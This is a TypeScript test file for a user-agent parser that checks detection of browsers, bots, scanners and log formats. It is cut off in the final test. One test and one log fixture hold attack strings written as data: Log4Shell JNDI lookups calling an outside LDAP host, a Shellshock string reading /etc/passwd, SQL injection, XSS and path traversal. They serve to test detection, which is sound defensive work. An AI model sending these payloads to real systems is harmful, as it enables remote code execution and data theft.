import assert from "node:assert/strict";
import {
  analyzeUa,
  tokenize,
  parseInput,
  parseBrandList,
  isGreaseBrand,
  extractLogUa,
  brandListValue,
  deviceCounts,
  MAX_ENTRIES,
  MAX_UA_LENGTH,
  MAX_ANALYZED_CHARS,
  type UaAnalysis,
} from "../../client/src/lib/toolkit/user-agent-parser.ts";

let passed = 0;
function test(name: string, fn: () => void) {
  try {
    fn();
    passed++;
  } catch (e) {
    console.error(`FAIL ${name}`);
    throw e;
  }
}

function expectUa(
  ua: string,
  want: {
    browser?: string | null;
    bversion?: string | null;
    engine?: string | null;
    eversion?: string | null;
    os?: string | null;
    osversion?: string | null;
    device?: string;
    model?: string | null;
    arch?: string | null;
    bot?: string | null;
    botKind?: string;
    reduced?: number;
  },
): UaAnalysis {
  const a = analyzeUa(ua);
  const ctx = `${ua}\n  got ${JSON.stringify({ b: a.browser, e: a.engine, os: a.os?.name, osv: a.os?.version, d: a.device, arch: a.arch, bot: a.bot?.name, r: a.reduced.length })}`;
  if ("browser" in want) assert.equal(a.browser?.name ?? null, want.browser, ctx);
  if ("bversion" in want) assert.equal(a.browser?.version ?? null, want.bversion, ctx);
  if ("engine" in want) assert.equal(a.engine?.name ?? null, want.engine, ctx);
  if ("eversion" in want) assert.equal(a.engine?.version ?? null, want.eversion, ctx);
  if ("os" in want) assert.equal(a.os?.name ?? null, want.os, ctx);
  if ("osversion" in want) assert.equal(a.os?.version ?? null, want.osversion, ctx);
  if ("device" in want) assert.equal(a.device.type, want.device, ctx);
  if ("model" in want) assert.equal(a.device.model, want.model, ctx);
  if ("arch" in want) assert.equal(a.arch, want.arch, ctx);
  if ("bot" in want) assert.equal(a.bot?.name ?? null, want.bot, ctx);
  if ("botKind" in want) assert.equal(a.bot?.kind, want.botKind, ctx);
  if ("reduced" in want) assert.equal(a.reduced.length, want.reduced, ctx);
  return a;
}

test("Chrome on Windows, reduced", () => {
  const a = expectUa("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", {
    browser: "Chrome", bversion: "124.0.0.0", engine: "Blink", eversion: "124", os: "Windows 10 or 11", osversion: "NT 10.0",
    device: "desktop", arch: "x86-64", bot: null, reduced: 2,
  });
  assert.ok(a.os!.note!.includes("Windows 11"));
  assert.equal(a.tokens[0].name, "Mozilla");
  assert.ok(a.tokens[0].note!.includes("Netscape"));
  assert.equal(a.tokens.filter((t) => t.kind === "comment").length, 2);
});

test("Chrome with a full version is not reported as reduced", () => {
  expectUa("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36", {
    browser: "Chrome", os: "Windows 7", reduced: 0,
  });
});

test("Edge", () => {
  expectUa("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.80", {
    browser: "Microsoft Edge", bversion: "124.0.2478.80", engine: "Blink",
  });
});

test("Legacy Edge and Windows Phone Edge", () => {
  expectUa("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582", {
    browser: "Microsoft Edge Legacy", bversion: "18.19582", engine: "EdgeHTML", eversion: "18.19582", device: "desktop",
  });
  expectUa("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15063", {
    browser: "Microsoft Edge Legacy", engine: "EdgeHTML", os: "Windows Phone", osversion: "10.0", device: "mobile",
  });
});

test("Safari on macOS, frozen version", () => {
  const a = expectUa("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15", {
    browser: "Safari", bversion: "17.4.1", engine: "WebKit", eversion: "605.1.15", os: "macOS Catalina", osversion: "10.15.7", device: "desktop", reduced: 0,
  });
  assert.ok(a.os!.note!.includes("iPad"));
});

test("Firefox on macOS freezes at 10.15", () => {
  expectUa("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0", {
    browser: "Firefox", engine: "Gecko", eversion: "125.0", os: "macOS Catalina", osversion: "10.15",
  });
  expectUa("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10", {
    os: "Mac OS X", osversion: "10.6.8", browser: "Safari", bversion: "5.1.9",
  });
  expectUa("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7", {
    os: "OS X El Capitan",
  });
});

test("iPhone and iPad Safari", () => {
  expectUa("Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1", {
    browser: "Mobile Safari", bversion: "17.4.1", engine: "WebKit", os: "iOS", osversion: "17.4.1", device: "mobile", model: "iPhone",
  });
  expectUa("Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1", {
    os: "iPadOS", osversion: "16.6", device: "tablet", model: "iPad",
  });
  expectUa("Mozilla/5.0 (iPad; CPU OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1", {
    os: "iOS", osversion: "12.5.7", device: "tablet",
  });
});

test("Chrome, Firefox and Edge on iOS run on WebKit", () => {
  expectUa("Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.88 Mobile/15E148 Safari/604.1", {
    browser: "Chrome for iOS", bversion: "124.0.6367.88", engine: "WebKit", os: "iOS", reduced: 0,
  });
  expectUa("Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/125.0 Mobile/15E148 Safari/605.1.15", {
    browser: "Firefox for iOS", engine: "WebKit",
  });
  expectUa("Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", {
    browser: "iOS WebView (in-app)", engine: "WebKit", device: "mobile",
  });
});

test("Firefox on Linux and Android", () => {
  expectUa("Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0", {
    browser: "Firefox", bversion: "125.0", engine: "Gecko", eversion: "125.0", os: "Linux", device: "desktop", arch: "x86-64",
  });
  expectUa("Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0", {
    browser: "Firefox for Android", os: "Android", osversion: "14", device: "mobile", model: null,
  });
  expectUa("Mozilla/5.0 (Android 14; Tablet; rv:125.0) Gecko/125.0 Firefox/125.0", { device: "tablet" });
  expectUa("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", { os: "Linux (Ubuntu)" });
});

test("Chrome on Android: reduced phone and tablet", () => {
  const a = expectUa("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36", {
    browser: "Chrome for Android", os: "Android", osversion: "10", device: "mobile", model: "K", reduced: 2,
  });
  assert.ok(a.os!.note!.includes("model K"));
  expectUa("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", {
    device: "tablet",
  });
});

test("Samsung Internet, stock Android browser, WebView, Dalvik", () => {
  expectUa("Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36", {
    browser: "Samsung Internet", bversion: "24.0", engine: "Blink", eversion: "117", model: "SM-S918B", device: "mobile",
  });
  expectUa("Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", {
    browser: "Android Browser (stock)", bversion: "4.0", engine: "WebKit", eversion: "534.30", osversion: "4.0.3", model: "HTC Sensation", device: "mobile",
  });
  expectUa("Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ3A.230805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36", {
    browser: "Android WebView", bversion: "116.0.0.0", model: "Pixel 7", device: "mobile",
  });
  expectUa("Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)", {
    browser: "Android app (system HTTP client)", os: "Android", osversion: "11", model: "SM-G991B", device: "unknown", bot: null,
  });
});

test("Internet Explorer 11 and 6", () => {
  const ie11 = expectUa("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", {
    browser: "Internet Explorer", bversion: "11.0", engine: "Trident", eversion: "7.0", os: "Windows 7", arch: "x86-64 (a 32-bit browser on 64-bit Windows)",
  });
  assert.ok(!ie11.findings.some((f) => /out of support/.test(f.text) && /Internet Explorer 11/.test(f.text)));
  const ie6 = expectUa("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)", {
    browser: "Internet Explorer", bversion: "6.0", engine: "Trident", eversion: null, os: "Windows XP", device: "desktop", bot: null,
  });
  assert.ok(ie6.findings.some((f) => f.tone === "warn" && /Internet Explorer 6.0/.test(f.text)));
  assert.ok(ie6.tokens[1].note!.includes("compatible"));
});

test("Opera Blink and Presto, Opera Mini", () => {
  expectUa("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0", {
    browser: "Opera", bversion: "110.0.0.0", engine: "Blink",
  });
  expectUa("Opera/9.80 (Windows NT 6.1; U; en) Presto/2.12.388 Version/12.16", {
    browser: "Opera (Presto)", bversion: "12.16", engine: "Presto", eversion: "2.12.388", os: "Windows 7",
  });
  expectUa("Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54", {
    browser: "Opera Mini", device: "mobile",
  });
});

test("ChromeOS frozen platform", () => {
  const a = expectUa("Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", {
    os: "ChromeOS", osversion: "14541.0.0", device: "desktop", reduced: 2,
  });
  assert.ok(a.os!.note!.includes("Frozen"));
});

test("Consoles and TVs", () => {
  expectUa("Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.67", {
    device: "console", os: "Xbox system software", model: "Xbox One", browser: "Microsoft Edge",
  });
  expectUa("Mozilla/5.0 (PlayStation 5 3.11) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15", {
    device: "console", os: "PlayStation 5 system software", osversion: "3.11", model: "PlayStation 5",
  });
  expectUa("Mozilla/5.0 (SMART-TV; LINUX; Tizen 6.0) AppleWebKit/537.36 (KHTML, like Gecko) 76.0.3809.146/6.0 TV Safari/537.36", {
    device: "tv", os: "Tizen", osversion: "6.0",
  });
});

test("Googlebot desktop, smartphone, legacy, and image", () => {
  const d = expectUa("Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/124.0.6367.155 Safari/537.36", {
    bot: "Googlebot", botKind: "search crawler", device: "bot", browser: "Chrome",
  });
  assert.equal(d.bot!.version, "2.1");
  assert.ok(d.findings.some((f) => /googlebot\.com/.test(f.text)));
  expectUa("Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.155 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", {
    bot: "Googlebot", device: "bot", model: "Nexus 5X", os: "Android",
  });
  expectUa("Googlebot/2.1 (+http://www.google.com/bot.html)", { bot: "Googlebot" });
  expectUa("Googlebot-Image/1.0", { bot: "Googlebot-Image" });
  expectUa("Mozilla/5.0 (compatible; Google-InspectionTool/1.0;)", { bot: "Google-InspectionTool" });
});

test("Other crawlers", () => {
  const b = expectUa("Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", { bot: "Bingbot", device: "bot" });
  assert.ok(b.findings.some((f) => /search\.msn\.com/.test(f.text)));
  expectUa("Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)", { bot: "GPTBot", botKind: "AI crawler" });
  expectUa("Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)", { bot: "ClaudeBot" });
  expectUa("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)", { bot: "facebookexternalhit", botKind: "social preview" });
  expectUa("LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)", { bot: "LinkedInBot" });
  expectUa("TelegramBot (like TwitterBot)", { bot: "TelegramBot" });
  expectUa("Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)", { bot: "AhrefsBot", botKind: "SEO crawler" });
  expectUa("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)", { bot: "Applebot" });
  expectUa("Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)", { bot: "YandexBot" });
  expectUa("Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)", { bot: "Baiduspider" });
  expectUa("DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)", { bot: "DuckDuckBot" });
});

test("Generic bots need a contact URL or compatible, so a phone model ending in bot is not one", () => {
  const g = expectUa("Mozilla/5.0 (compatible; MyCrawler/1.0; +https://example.com/bot)", { bot: "MyCrawler", botKind: "crawler" });
  assert.equal(g.bot!.version, "1.0");
  expectUa("Mozilla/5.0 (Linux; Android 10; CUBOT_X30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36", {
    bot: null, device: "mobile", model: "CUBOT_X30",
  });
  expectUa("SomeFetcherThing/2.0 (+https://example.net/about)", { bot: "SomeFetcherThing" });
});

test("Command-line tools and libraries", () => {
  expectUa("curl/8.4.0", { bot: "curl", botKind: "command-line tool", device: "bot", browser: null });
  expectUa("Wget/1.21.4", { bot: "Wget" });
  expectUa("python-requests/2.31.0", { bot: "python-requests", botKind: "HTTP library" });
  expectUa("Python-urllib/3.11", { bot: "urllib" });
  expectUa("Python/3.11 aiohttp/3.9.3", { bot: "aiohttp" });
  const go = expectUa("Go-http-client/1.1", { bot: "Go-http-client" });
  assert.equal(go.bot!.version, "1.1");
  assert.ok(go.findings.some((f) => /HTTP version/.test(f.text)));
  expectUa("Java/1.8.0_392", { bot: "Java" });
  expectUa("okhttp/4.12.0", { bot: "OkHttp" });
  expectUa("Apache-HttpClient/4.5.14 (Java/17.0.9)", { bot: "Apache HttpClient" });
  expectUa("axios/1.6.8", { bot: "axios" });
  expectUa("PostmanRuntime/7.37.3", { bot: "Postman", botKind: "API client" });
  expectUa("Mozilla/5.0 (Windows NT 10.0; Microsoft Windows 10.0.19045; en-US) PowerShell/7.4.1", { bot: "PowerShell", os: "Windows 10 or 11" });
  expectUa("Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4291", { bot: "PowerShell" });
  expectUa("Scrapy/2.11.1 (+https://scrapy.org)", { bot: "Scrapy" });
  expectUa("libwww-perl/6.72", { bot: "libwww-perl" });
});

test("Security scanners", () => {
  const s = expectUa("sqlmap/1.7.2#stable (https://sqlmap.org)", { bot: "sqlmap", botKind: "security scanner", device: "bot" });
  assert.equal(s.bot!.version, "1.7.2#stable");
  assert.ok(s.findings.some((f) => f.tone === "danger"));
  const n = expectUa("Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)", { bot: "Nikto" });
  assert.equal(n.bot!.version, "2.1.6");
  expectUa("Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", { bot: "Nmap NSE" });
  expectUa("masscan/1.3 (https://github.com/robertdavidgraham/masscan)", { bot: "masscan", botKind: "internet scanner" });
  expectUa("Mozilla/5.0 zgrab/0.x", { bot: "ZGrab" });
  expectUa("Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)", { bot: "CensysInspect" });
  expectUa("gobuster/3.6", { bot: "gobuster" });
  expectUa("Fuzz Faster U Fool v2.1.0-dev", { bot: "ffuf" });
  expectUa("Mozilla/4.0 (Hydra)", { bot: "THC Hydra" });
  expectUa("WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)", { bot: "WPScan" });
  expectUa("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/124.0.6367.60 Safari/537.36", {
    bot: "Headless Chrome", botKind: "automation", browser: "Headless Chrome", engine: "Blink",
  });
});

test("Payload findings: Log4Shell, Shellshock, SQLi, XSS, traversal", () => {
  const l4 = analyzeUa("${jndi:ldap://198.51.100.7:1389/a}");
  assert.ok(l4.findings.some((f) => f.tone === "danger" && /CVE-2021-44228/.test(f.text)));
  const obf = analyzeUa("Mozilla/5.0 ${${lower:j}${lower:n}di:${lower:l}dap://x/}");
  assert.ok(obf.findings.some((f) => f.tone === "danger" && /Log4Shell/.test(f.text)));
  const plain = analyzeUa("Mozilla/5.0 ${foo}");
  assert.ok(plain.findings.some((f) => f.tone === "warn" && /expression/.test(f.text)));
  const ss = analyzeUa("() { :; }; /bin/bash -c 'cat /etc/passwd'");
  assert.ok(ss.findings.some((f) => f.tone === "danger" && /CVE-2014-6271/.test(f.text)));
  const sqli = analyzeUa("Mozilla/5.0' AND SLEEP(5)-- -");
  assert.ok(sqli.findings.some((f) => /SQL injection/.test(f.text)));
  assert.ok(analyzeUa("x' or '1'='1").findings.some((f) => /SQL/.test(f.text)));
  assert.ok(analyzeUa("x UNION/**/SELECT 1").findings.some((f) => /SQL/.test(f.text)));
  const xss = analyzeUa("<script>alert(1)</script>");
  assert.ok(xss.findings.some((f) => /HTML or script/.test(f.text)));
  assert.ok(analyzeUa("../../../../etc/passwd").findings.some((f) => /traversal/.test(f.text)));
  // A normal browser string triggers none of these.
  const clean = analyzeUa("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
  assert.ok(!clean.findings.some((f) => f.tone === "danger" || f.tone === "warn"));
});

test("Contradictions", () => {
  assert.ok(analyzeUa("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36").findings.some((f) => /CriOS/.test(f.text)));
  assert.ok(analyzeUa("Mozilla/5.0 (Windows NT 10.0; Intel Mac OS X 10_15_7) Chrome/124.0.0.0").findings.some((f) => /both Windows and macOS/.test(f.text)));
});

test("Empty and dash", () => {
  for (const s of ["", "-", "   "]) {
    const a = analyzeUa(s);
    assert.ok(a.findings.some((f) => /No User-Agent/.test(f.text)));
    assert.equal(a.device.type, "unknown");
  }
});

test("Tokenizer: nesting, quoted-pair, unbalanced", () => {
  const t = tokenize("Foo/1.0 (a; (nested; x) b) Bar/2 word");
  assert.deepEqual(t.tokens.map((x) => x.kind), ["product", "comment", "product", "word"]);
  assert.equal(t.tokens[1].text, "(a; (nested; x) b)");
  assert.equal(t.note, null);
  const q = tokenize("X/1 (a \\) b)");
  assert.equal(q.tokens[1].parts[0], "a ) b");
  const u = tokenize("X/1 (never closed; y");
  assert.ok(u.note!.includes("never closed"));
  const s = tokenize("X/1 ) Y/2");
  assert.ok(s.note!.includes("no matching"));
  assert.equal(tokenize("").tokens.length, 0);
});

test("Log lines: combined format, escaped quotes, nginx hex escapes, missing UA", () => {
  const line = '203.0.113.9 - - [10/Oct/2026:13:55:36 -0700] "GET /index.html HTTP/1.1" 200 2326 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"';
  assert.equal(extractLogUa(line), "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)");
  assert.equal(extractLogUa('x "a" "Mozilla/5.0 \\"evil\\" test"'), 'Mozilla/5.0 "evil" test');
  assert.equal(extractLogUa('x "a" "say \\x22hi\\x22"'), 'say "hi"');
  assert.equal(extractLogUa('x "a" "ends with backslash \\\\"'), "ends with backslash \\");
  const out = parseInput([
    line,
    '198.51.100.4 - - [10/Oct/2026:13:55:37 -0700] "GET /?q=1 HTTP/1.1" 200 12 "-" "${jndi:ldap://198.51.100.7/a}"',
    '198.51.100.5 - - [10/Oct/2026:13:55:38 -0700] "GET / HTTP/1.1" 400 0 "-" "-"',
    "2001:db8::1 - - [10/Oct/2026:13:55:39 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"curl/8.4.0\"",
    "fe80::1 - - [10/Oct/2026:13:55:39 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"Wget/1.21\"",
  ].join("\n"));
  assert.equal(out.entries.length, 5);
  assert.ok(out.entries.every((e) => e.source === "log"));
  const kinds = out.entries.map((e) => (e.kind === "ua" ? e.analysis.bot?.name ?? "none" : "err"));
  assert.deepEqual(kinds, ["Bingbot", "none", "none", "curl", "Wget"]);
  const e1 = out.entries[1];
  assert.ok(e1.kind === "ua" && e1.analysis.findings.some((f) => f.tone === "danger"));
});

test("Header block: User-Agent read, others skipped, request line skipped", () => {
  const out = parseInput("GET / HTTP/1.1\nHost: example.com\nUser-Agent: curl/8.4.0\nAccept: */*\n");
  assert.equal(out.entries.length, 1);
  assert.equal(out.entries[0].source, "header");
  assert.equal(out.ignored, 3);
  assert.equal(out.hints, null);
});

test("Client hints: brand list grammar and GREASE", () => {
  const r = parseBrandList('"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"');
  assert.ok(r.ok);
  if (r.ok) {
    assert.deepEqual(r.brands.map((b) => [b.brand, b.version, b.grease]), [
      ["Chromium", "124", false],
      ["Google Chrome", "124", false],
      ["Not-A.Brand", "99", true],
    ]);
  }
  for (const g of [" Not A;Brand", "Not A(Brand", "Not)A;Brand", "Not_A Brand", "Not/A)Brand", "Not.A/Brand", "Not;A=Brand", "Not:A-Brand", "Not=A?Brand", "Not?A_Brand"]) {
    assert.ok(isGreaseBrand(g), g);
  }
  assert.ok(!isGreaseBrand("Brave"));
  assert.ok(!isGreaseBrand("Chromium"));
  const esc = parseBrandList('"A \\"quoted\\" brand";v="1"');
  assert.ok(esc.ok && esc.brands[0].brand === 'A "quoted" brand');
  assert.equal(parseBrandList("").ok, false);
  assert.equal(parseBrandList('"unterminated;v="1"').ok, false);
  assert.equal(parseBrandList('"A";v="1" "B";v="2"').ok, false);
  assert.equal(parseBrandList("Chromium;v=1").ok, false);
  // Round trip through the serializer.
  const v = brandListValue([{ brand: 'We"ird\\', version: "1" }, { brand: "Not A(Brand", version: "8" }]);
  const back = parseBrandList(v);
  assert.ok(back.ok && back.brands[0].brand === 'We"ird\\' && back.brands[1].grease);
});

test("Client hints: Windows 11 from platform version, mismatches", () => {
  const out = parseInput([
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    'Sec-CH-UA: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    "Sec-CH-UA-Mobile: ?0",
    'Sec-CH-UA-Platform: "Windows"',
    'Sec-CH-UA-Platform-Version: "15.0.0"',
  ].join("\n"));
  assert.equal(out.entries.length, 1);
  assert.ok(out.hints);
  const h = out.hints!;
  assert.equal(h.platform, "Windows");
  assert.equal(h.mobile, false);
  assert.ok(h.findings.some((f) => /Windows 11/.test(f.text)));
  assert.ok(h.findings.some((f) => /GREASE/.test(f.text)));
  assert.ok(!h.findings.some((f) => f.tone === "warn"));
  for (const [pv, want] of [["10.0.0", "Windows 10"], ["1.0.0", "Windows 10"], ["13.0.0", "Windows 11"], ["0.3.0", "older than Windows 10"]]) {
    const o = parseInput(`Sec-CH-UA-Platform: "Windows"\nSec-CH-UA-Platform-Version: "${pv}"`);
    assert.ok(o.hints!.findings.some((f) => f.text.includes(want)), pv);
  }
  const mismatch = parseInput([
    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    'Sec-CH-UA-Platform: "Windows"',
    "Sec-CH-UA-Mobile: ?1",
  ].join("\n"));
  const mf = mismatch.hints!.findings.filter((f) => f.tone === "warn").map((f) => f.text);
  assert.equal(mf.length, 3, mf.join("\n"));
  const bad = parseInput("Sec-CH-UA-Mobile: yes\nSec-CH-UA-Platform: Windows");
  assert.equal(bad.hints!.errors.length, 2);
});

test("Quoted UA lines, caps, too-long lines", () => {
  const q = parseInput('"curl/8.4.0"');
  assert.ok(q.entries[0].kind === "ua" && q.entries[0].analysis.bot?.name === "curl");
  const many = parseInput(Array(MAX_ENTRIES + 20).fill("curl/8.4.0").join("\n"));
  assert.equal(many.entries.length, MAX_ENTRIES);
  assert.equal(many.truncated, 20);
  const long = parseInput("Mozilla/5.0 " + "A".repeat(MAX_UA_LENGTH));
  assert.equal(long.entries[0].kind, "error");
  const huge = parseInput("x".repeat(2_000_001));
  assert.ok(huge.error);
  assert.equal(huge.entries.length, 0);
  const counts = deviceCounts(parseInput("curl/1\nMozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1").entries);
  assert.equal(counts.bot, 1);
  assert.equal(counts.mobile, 1);
});

test("Adversarial inputs finish quickly and never throw", () => {
  const nasty = [
    "(".repeat(MAX_UA_LENGTH - 1),
    ")".repeat(MAX_UA_LENGTH - 1),
    "a".repeat(MAX_UA_LENGTH - 1),
    "bot".repeat(2700),
    "${".repeat(4000),
    "' or ".repeat(1600),
    "union/*".repeat(1100),
    "Version/1 ".repeat(800),
    "Mozilla/5.0 (" + "a;".repeat(4000) + ")",
    "() {".repeat(2000),
    "\\".repeat(8000),
    "\u0000\u0001\u0002".repeat(2000),
    "+http://".repeat(1000),
    "compatible; " + "x".repeat(8000) + "bot",
  ];
  for (const s of nasty) {
    const t0 = performance.now();
    parseInput(s);
    analyzeUa(s);
    const ms = performance.now() - t0;
    assert.ok(ms < 250, `${s.slice(0, 20)} took ${ms.toFixed(0)} ms`);
  }
  const alphabet = "Mozilla/5.0 ();:,\"'\\{}$[]<>/AppleWebKitChromeSafariFirefoxbot+http";
  for (let i = 0; i < 4000; i++) {
    const len = Math.floor(Math.random() * 200);
    let s = "";
    for (let j = 0; j < len; j++) s += alphabet[Math.floor(Math.random() * alphabet.length)];
    parseInput(s);
    analyzeUa(s);
    parseBrandList(s);
    extractLogUa(s);
  }
  // A big but legal paste: 500 lines of a long realistic UA.
  const t0 = performance.now();
  parseInput(Array(500).fill("Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36").join("\n"));
  assert.ok(performance.now() - t0 < 1000);
});


/* ------------------------------------------------------------------------
 * Independent verifier cases. Strings are the ones vendors publish (Google
 * and Microsoft crawler docs, the Chromium UA reduction doc, MDN, Microsoft's
 * Edge and Windows 11 detection docs) or real device strings.
 * ---------------------------------------------------------------------- */

test("verifier: published crawler strings", () => {
  expectUa("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", {
    bot: "Googlebot", device: "bot", browser: null,
  });
  const bing = expectUa(
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36",
    { bot: "Bingbot", botKind: "search crawler", device: "bot" },
  );
  assert.equal(bing.bot!.version, "2.0");
  assert.match(bing.bot!.verify!, /search\.msn\.com/);
  expectUa("Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)", {
    bot: "GPTBot", botKind: "AI crawler",
  });
});

test("verifier: Chromium's documented reduced strings", () => {
  // From the Chromium User-Agent Reduction doc, unified platform examples.
  expectUa("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36", {
    browser: "Chrome for Android", bversion: "110.0.0.0", os: "Android", osversion: "10", device: "mobile", model: "K", reduced: 2,
  });
